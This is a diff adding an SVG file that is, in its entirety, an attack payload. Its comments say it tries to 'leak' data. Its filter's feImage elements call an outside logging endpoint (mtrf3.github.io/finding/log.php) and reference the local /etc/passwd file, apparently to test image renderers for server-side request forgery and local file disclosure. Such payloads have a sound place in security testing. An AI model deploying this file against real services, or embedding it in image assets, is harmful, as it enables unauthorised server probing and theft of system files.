@@ -1,0 +1,21 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="300" height="100" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+        <filter id="leak">
+            <!-- Try to leak through feImage -->
+            <feImage xlink:href="https://mtrf3.github.io/finding/log.php?f=1" />
+            
+            <!-- Try to leak through external content -->
+            <feImage xlink:href="/etc/passwd" />
+            
+            <!-- Attempt to load remote content -->
+            <feMorphology operator="dilate" radius="2">
+                <feImage xlink:href="https://mtrf3.github.io/finding/log.php?m=1" />
+            </feMorphology>
+        </filter>
+    </defs>
+    
+    <!-- Visible rectangle with filter -->
+    <rect width="300" height="100" fill="green" filter="url(#leak)" />
+</svg>
